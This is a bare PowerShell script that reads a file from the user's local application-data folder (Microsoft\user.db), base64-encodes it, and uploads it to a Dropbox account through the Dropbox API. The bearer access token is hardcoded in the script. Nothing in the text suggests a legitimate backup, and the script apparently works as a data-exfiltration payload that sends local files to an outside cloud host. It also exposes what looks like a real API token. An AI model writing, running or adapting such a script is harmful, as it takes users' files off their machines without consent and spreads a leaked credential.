# Set your access token
$accessToken = "sl.Bbs1fB9G7Qjtwe6qjsjleeg9UQplx7CC6bDlUHj_yN2Wv_bUA95qO-k3qDA3CB_bkEv0TK7cRVexjcRzbJJpKYwaBatmgiKcaLClLe1OVPx5RobEUfMmnEic9Oz1VMnFxJcF7v4xxwN4"

# Set the file path and destination path
$filePath = "$env:LOCALAPPDATA\Microsoft\user.db"
$destinationPath = "/user.db"

# Read file content as bytes
$fileContent = Get-Content -Path $filePath -Encoding Byte

# Convert file content to Base64
$fileContentBase64 = [System.Convert]::ToBase64String($fileContent)

# Prepare headers
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Dropbox-API-Arg" = '{"path": "' + $destinationPath + '", "mode": "add", "autorename": true, "mute": false}'
    "Content-Type" = "application/octet-stream"
}

# Make the API request
$apiUrl = "https://content.dropboxapi.com/2/files/upload"
$response = Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $fileContentBase64

# Print response
Write-Host "File uploaded successfully. Response:" $response
